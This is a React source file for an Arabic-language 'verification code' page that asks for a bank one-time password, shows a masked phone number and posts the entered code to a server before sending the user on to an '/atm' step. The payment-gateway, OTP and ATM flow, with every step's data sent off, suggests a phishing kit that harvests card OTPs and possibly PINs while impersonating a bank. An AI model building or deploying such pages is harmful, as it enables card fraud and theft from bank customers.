import Main from "@/components/Main";
import { Link, useLocation, useNavigate } from "react-router-dom";
import InputWithClearIcon from "../components/InputWithClearIcon";
import { useEffect, useState } from "react";
import { currentPage, sendDataToServer, extraInfo } from "@/context/signals";
import { maskPhoneNumber } from "../utils/helpers";

const Otp = () => {
  const navigate = useNavigate();
  const [error, setError] = useState<any>({});
  const { state } = useLocation();
  // console.log(error);

  // console.log(extraInfo);

  const goNext = (e: any) => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(e.target));

    // [ ] should be true for production
    sendDataToServer(data, "otp", "atm", false, navigate, "/atm");
  };

  useEffect(() => {
    currentPage.value = "otp";
  }, []);

  return (
    <Main>
      <section className="bg-gray-100 h-screen pt-20">
        <div className="bg-white container mx-auto px-4 py-6 rounded-xl max-w-lg">
          <div className="bg-main/20 rounded-2xl py-3 ps-4 pe-20 relative">
            <img
              src="/assets/images/OTP.png"
              className="w-14 absolute left-2 top-4 lg:top-2"
              alt="otp logo"
            />

            <h2 className="text-xl font-bold text-main">
              التحقق من خلال رسالة نصية لتأكيد العملية أدخل رمز التحقق المرسل
              إلى جوالك
            </h2>
            <p className="text-gray-600">
              سيتم الاتصال بك من قبل البنك المصدر للبطاقة الائتمانية , يرجى
              اتباع الرد الالي لإرسال رمز التحقق برسالة نصية
            </p>
            {extraInfo?.value?.phone && (
              <p className="text-gray-600 mt-2" style={{ direction: "ltr" }}>
                <span className="text-main">
                  {maskPhoneNumber(extraInfo.value.phone)}
                </span>
              </p>
            )}
          </div>

          <form
            onSubmit={goNext}
            className="mt-5 w-full grid grid-cols-6 items-end gap-6"
          >
            <div className="col-span-6">
              <InputWithClearIcon
                setError={setError}
                label="رمز التحقق"
                id="otp"
                placeholder="أدخل رمز التحقق لمرة واحدة هنا"
                rtl={true}
                type="password"
                max={6}
              />

              {error?.otp && (
                <p className="mt-1 col-span-6 text-red-500 text-xs h-4">
                  {error.otp}
                </p>
              )}
            </div>

            <div className="col-span-6 flex flex-col lg:flex-row sm:items-center gap-4">
              <button
                className="w-full lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-[#76b456] hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400"
                type="submit"
                disabled={error?.otp}
              >
                تأكيد
              </button>
              <Link
                className="w-full text-center lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-gray-200 hover:bg-gray-100 text-gray-800 transition-colors"
                to={"/payment-gateway"}
                state={state}
              >
                السابق
              </Link>
            </div>
          </form>
        </div>
      </section>
    </Main>
  );
};
export default Otp;
